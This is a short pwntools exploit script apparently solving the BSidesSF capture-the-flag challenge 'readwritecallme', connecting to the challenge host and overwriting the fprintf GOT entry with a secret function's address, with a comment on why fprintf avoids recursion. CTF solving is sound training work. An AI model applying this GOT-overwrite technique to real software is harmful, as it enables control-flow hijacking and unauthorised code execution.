from pwn import *

binary = ELF('./readwritecallme')
p = remote('readwritecallme-b32595e6.challenges.bsidessf.net', 4444)

fprintf_got = 0x404030
secret = 0x401528

p.recvuntil(b'GO\n')

# Overwrite fprintf@GOT with secret_function
# fprintf is called right after fread completes, and is NOT called inside
# secret_function — so no infinite recursion like puts@GOT would cause
p.sendline(b'w')
p.sendline(hex(fprintf_got).encode())
p.sendline(b'8')
p.send(p64(secret))

print(p.recvall(timeout=5))
